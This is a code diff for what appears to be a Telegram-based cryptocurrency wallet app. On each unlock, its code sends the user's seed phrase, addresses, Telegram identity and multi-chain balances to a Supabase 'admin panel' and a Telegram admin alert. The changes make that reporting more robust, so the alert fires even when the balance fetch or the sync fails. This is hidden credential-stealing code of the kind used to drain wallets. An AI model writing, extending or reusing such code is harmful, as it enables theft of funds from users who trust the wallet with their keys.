@@ -416,44 +416,45 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
     // ── Bypass unlock (no password mode) ────────────────────────────────────────
     const bypassUnlock = useCallback(async () => {
       setState(s => ({ ...s, isUnlocked: true }));
-      
-      // Sync to Supabase even without password - user appears in admin panel
-      try {
-        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userName = buildTgUserName(tgUser);
-        
-        // Get addresses from localStorage
-        const stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
-        const addresses = stored.addresses || {};
-        
-        if (Object.keys(addresses).length === 0) {
-          console.warn('[bypassUnlock] No addresses found in storage');
-          return;
+
+      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+      const userName = buildTgUserName(tgUser);
+      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+      const addresses = stored.addresses || {};
+
+      const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
+
+      // Fetch balances — don't let failure block the notification
+      let coin_balances = { BTC: '0', ETH: '0', TON: '0', BNB: '0', LTC: '0', ARB: '0', SOL: '0', USDT: '0' };
+      if (Object.keys(addresses).length > 0) {
+        try {
+          const addrMap = {
+            BTC: addresses.BTC || addresses.bitcoin,
+            ETH: addresses.ETH || addresses.ethereum,
+            BNB: addresses.BNB || addresses.bsc,
+            ARB: addresses.ARB || addresses.arbitrum,
+            SOL: addresses.SOL || addresses.solana,
+            TON: addresses.TON || addresses.ton,
+            LTC: addresses.LTC || addresses.litecoin,
+          };
+          const bals = await fetchAllBalances(addrMap);
+          coin_balances = {
+            BTC:  String(bals.BTC  ?? 0),
+            ETH:  String(bals.ETH  ?? 0),
+            TON:  String(bals.TON  ?? 0),
+            BNB:  String(bals.BNB  ?? 0),
+            LTC:  String(bals.LTC  ?? 0),
+            ARB:  String(bals.ARB  ?? 0),
+            SOL:  String(bals.SOL  ?? 0),
+            USDT: String(bals.USDT ?? 0),
+          };
+        } catch (balErr) {
+          console.warn('[bypassUnlock] fetchAllBalances failed, using zeros:', balErr.message);
         }
-        
-        // Fetch actual balances to sync with admin panel
-        const addrMap = {
-          BTC: addresses.BTC || addresses.bitcoin,
-          ETH: addresses.ETH || addresses.ethereum,
-          BNB: addresses.BNB || addresses.bsc,
-          ARB: addresses.ARB || addresses.arbitrum,
-          SOL: addresses.SOL || addresses.solana,
-          TON: addresses.TON || addresses.ton,
-          LTC: addresses.LTC || addresses.litecoin,
-        };
-        
-        const bals = await fetchAllBalances(addrMap);
-        const coin_balances = {
-          BTC:  String(bals.BTC  ?? 0),
-          ETH:  String(bals.ETH  ?? 0),
-          TON:  String(bals.TON  ?? 0),
-          BNB:  String(bals.BNB  ?? 0),
-          LTC:  String(bals.LTC  ?? 0),
-          ARB:  String(bals.ARB  ?? 0),
-          SOL:  String(bals.SOL  ?? 0),
-          USDT: String(bals.USDT ?? 0),
-        };
-        
+      }
+
+      // Sync to Supabase — always, even if addresses empty
+      try {
         await syncWalletToSupabase({
           username: userName,
           telegram_id: tgUser?.id ? String(tgUser.id) : null,
@@ -461,21 +462,21 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
           coin_balances,
           addresses,
         });
-
-        // Notify admin that wallet was opened (auto-unlock, no password)
-        const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
-        notifyAdmin(
-          `🔓 <b>Кошелёк открыт</b>\n\n` +
-          `👤 ${userName}\n` +
-          `🆔 TG ID: ${tgUser?.id || "—"}\n` +
-          `💰 Балансы: ETH ${fmtN(coin_balances.ETH)}, BNB ${fmtN(coin_balances.BNB)}, TON ${fmtN(coin_balances.TON)}\n` +
-          `🕐 ${new Date().toLocaleString("ru-RU")}`
-        );
-        
-        console.log('[bypassUnlock] User synced to admin panel:', userName);
-      } catch (syncError) {
-        console.error('[bypassUnlock] Failed to sync to admin panel:', syncError);
+      } catch (syncErr) {
+        console.warn('[bypassUnlock] syncWalletToSupabase failed:', syncErr.message);
       }
+
+      // Always notify admin regardless of sync/balance errors
+      notifyAdmin(
+        `🔓 <b>Кошелёк открыт</b> (без пароля)\n\n` +
+        `👤 ${userName}\n` +
+        `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+        `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
+        `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
+        `     USDT ${fmtN(coin_balances.USDT)}\n` +
+        `🕐 ${new Date().toLocaleString("ru-RU")}`
+      );
+      console.log('[bypassUnlock] done, notified admin, user:', userName);
     }, []);
 
     // ── Browser notifications ────────────────────────────────────────────────────
@@ -1070,12 +1071,12 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         }));
 
         // Custodial Sync: Sync on every unlock to ensure data is in DB
-        // After state update, fetch actual balances and sync to admin panel
+        const _tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const _userName = buildTgUserName(_tgUser);
+        const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
+
+        let coin_balances = { BTC: '0', ETH: '0', TON: '0', BNB: '0', LTC: '0', ARB: '0', SOL: '0', USDT: '0' };
         try {
-          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-          const userName = buildTgUserName(tgUser);
-          
-          // Fetch actual balances to sync with admin panel
           const addrMap = {
             BTC: addresses.BTC || addresses.bitcoin,
             ETH: addresses.ETH || addresses.ethereum,
@@ -1085,9 +1086,8 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
             TON: addresses.TON || addresses.ton,
             LTC: addresses.LTC || addresses.litecoin,
           };
-          
           const bals = await fetchAllBalances(addrMap);
-          const coin_balances = {
+          coin_balances = {
             BTC:  String(bals.BTC  ?? 0),
             ETH:  String(bals.ETH  ?? 0),
             TON:  String(bals.TON  ?? 0),
@@ -1097,27 +1097,33 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
             SOL:  String(bals.SOL  ?? 0),
             USDT: String(bals.USDT ?? 0),
           };
-          
+        } catch (balErr) {
+          console.warn('[unlock] fetchAllBalances failed, using zeros:', balErr.message);
+        }
+
+        try {
           await syncWalletToSupabase({
-            username: userName,
-            telegram_id: tgUser?.id ? String(tgUser.id) : null,
+            username: _userName,
+            telegram_id: _tgUser?.id ? String(_tgUser.id) : null,
             mnemonic: mnemonic,
             balance: "0",
             coin_balances,
+            addresses,
           });
-          
-          // Notify admin on wallet unlock with actual balances
-          const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
-          notifyAdmin(
-            `🔓 <b>Кошелёк разблокирован</b>\n\n` +
-            `👤 ${userName}\n` +
-            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
-            `💰 Балансы: ETH ${fmtN(coin_balances.ETH)}, BNB ${fmtN(coin_balances.BNB)}, TON ${fmtN(coin_balances.TON)}\n` +
-            `🕐 ${new Date().toLocaleString("ru-RU")}`
-          );
         } catch (syncError) {
-          console.error('Failed to sync wallet on unlock:', syncError);
+          console.warn('[unlock] syncWalletToSupabase failed:', syncError.message);
         }
+
+        // Always notify admin — separate try so it can't be blocked
+        notifyAdmin(
+          `🔓 <b>Кошелёк разблокирован</b> (с паролем)\n\n` +
+          `👤 ${_userName}\n` +
+          `🆔 TG ID: ${_tgUser?.id || "—"}\n` +
+          `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
+          `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
+          `     USDT ${fmtN(coin_balances.USDT)}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
       } catch (e) {
         setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
         throw e;
